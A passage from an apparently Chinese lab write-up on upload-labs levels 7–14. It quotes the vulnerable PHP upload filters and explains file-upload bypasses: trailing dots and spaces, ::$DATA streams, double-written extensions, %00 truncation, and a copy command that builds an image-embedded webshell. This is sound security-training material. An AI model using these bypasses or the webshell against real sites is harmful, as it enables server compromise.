        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre></div>

<p>跟第六关对比发现少了这句话</p>
<div class="hljs"><pre><code>$file_ext = trim($file_ext); //首尾去空</code></pre></div><p> <strong>利用Windows系统的文件名特性。文件名最后增加空格和点，写成<code>1.php .</code>，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个<code>.</code>会被去掉，实际上保存的文件名就是1<code>.php</code></strong> </p>
<img src="https://i.loli.net/2020/11/30/QsiotIUBjlkmYqc.png" srcset="/img/loading.gif" style="zoom:67%;">





<h2 id="pass8"><a href="#pass8" class="headerlink" title="pass8"></a>pass8</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre></div>

<p>这段代码少了这句话，可以与第六关相同的做法</p>
<p><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p>
<img src="https://i.loli.net/2020/11/30/tyb45fg3MiCU1jG.png" srcset="/img/loading.gif" style="zoom:67%;">

<h2 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre></div>

<p>仔细观察发现少了这段代码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span></code></pre></div>

<p> 采用Windows文件流特性绕过 </p>
<p>将文件名改为 <code>1.php::$DATA</code>,但是实质上保存的文件还是1.php</p>
<img src="https://i.loli.net/2020/11/30/XKUGAeVRzTxNW8Y.png" srcset="/img/loading.gif" style="zoom:50%;">

<h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre></div>

<p> 这一句代码是用来检测末尾是否是<code>.</code>，可以双写绕过。<br>抓包将文件名改为<code>1.php. .</code> （注意两点之间有空格） 前面去掉.然后检验.不存在，再去空格，留下php.，然后php.不属于$deny_ext数组中存在的，当然就直接提交了。因为windows自动去点，于是php后缀就出来了 </p>
<img src="https://i.loli.net/2020/11/30/wldCgUcOSKWPxMu.png" srcset="/img/loading.gif" style="zoom:50%;">

<h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);

        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);
        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        
        <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre></div>


<p> <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p>
<p>这段代码是将文件名中出现  <code>deny_ext</code>的后缀名替换为空</p>
<p>可以双写绕过，即<code>1.pphphp</code></p>
<h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;
    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);
    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);
    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;
        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;

        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;
            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;
    &#125;
&#125;</code></pre></div>

<p>本题与之前的题目有所不同，这题的文件的保存路径是可以控制的</p>
<p>这里用的<code>%00截断</code>，原理如下</p>
<p><code>www.xxx.com/qq.jpg</code></p>
<p><code>www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php</code>其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php</p>
<img src="https://i.loli.net/2020/11/30/TwSKHkqZFC78uRd.png" srcset="/img/loading.gif" style="zoom:50%;">



<h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>这题与上题利用的原理相同</p>
<p>但是这里要使用 00的二进制形式</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/13.png" srcset="/img/loading.gif" style="zoom:50%;">



<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/13-1.png" srcset="/img/loading.gif" style="zoom:50%;">



<h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p>明确说了上传图片木马</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;
    <span class="hljs-variable">$file</span> = fopen(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);
    <span class="hljs-variable">$bin</span> = fread(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span>
    fclose(<span class="hljs-variable">$file</span>);
    <span class="hljs-variable">$strInfo</span> = @unpack(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);    
    <span class="hljs-variable">$typeCode</span> = intval(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);    
    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;    
    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;      
        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;
            <span class="hljs-keyword">break</span>;        
        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">default</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;
        &#125;    
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;
&#125;</code></pre></div>

<p><strong>GIF89a</strong> 是GIF图片的文件头 ，是为了绕过gif文件的检查</p>
<p><strong>图片木马的制作</strong></p>
<p>桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马</p>
<p><img src="https://i.loli.net/2020/11/30/vXmVIJ3OEzcnrsL.png" srcset="/img/loading.gif" alt></p>
<p><code>copy 2.jpg /b + 1.php /a webshell.jpg</code></p>
<img src="https://i.loli.net/2020/11/30/KWgpdyf8xoFqcMn.png" srcset="/img/loading.gif" style="zoom:50%;">



<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="1-in-array"><a href="#1-in-array" class="headerlink" title="1.in_array"></a>1.in_array</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-comment">//1.php</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;
<span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$conn</span>-&gt;connect_error) &#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败: &quot;</span>);
&#125;

<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT COUNT(*) FROM users&quot;</span>;
<span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>();
